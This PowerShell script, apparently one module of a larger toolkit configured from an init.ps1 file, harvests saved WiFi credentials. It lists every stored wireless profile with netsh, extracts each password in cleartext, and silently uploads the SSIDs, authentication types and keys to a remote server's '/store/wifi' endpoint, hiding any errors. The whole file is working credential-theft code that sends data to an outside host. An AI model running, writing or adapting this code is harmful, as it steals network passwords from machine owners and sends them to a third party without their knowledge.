# wifi.ps1 - inherits $H, $P, $AU, $TH from init.ps1

$out = [System.Text.StringBuilder]::new()

$profiles = netsh wlan show profiles 2>$null |
            Select-String "All User Profile" |
            ForEach-Object { ($_ -split ":")[1].Trim() }

if (-not $profiles) {
    $out.AppendLine("No WiFi profiles found.") | Out-Null
} else {
    foreach ($name in $profiles) {
        $detail = netsh wlan show profile name="$name" key=clear 2>$null
        $pass   = ($detail | Select-String "Key Content") -replace ".*:\s*", ""
        $auth   = ($detail | Select-String "Authentication") | Select-Object -First 1
        $auth   = $auth -replace ".*:\s*", ""

        $out.AppendLine("") | Out-Null
        $out.AppendLine("SSID     : $name") | Out-Null
        $out.AppendLine("Auth     : $auth") | Out-Null
        if ($pass) {
            $out.AppendLine("Password : $pass") | Out-Null
        } else {
            $out.AppendLine("Password : (none / open / not retrievable)") | Out-Null
        }
    }
}

$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
try { $wc.UploadString("https://${H}:${P}/store/wifi", $out.ToString()) } catch {}
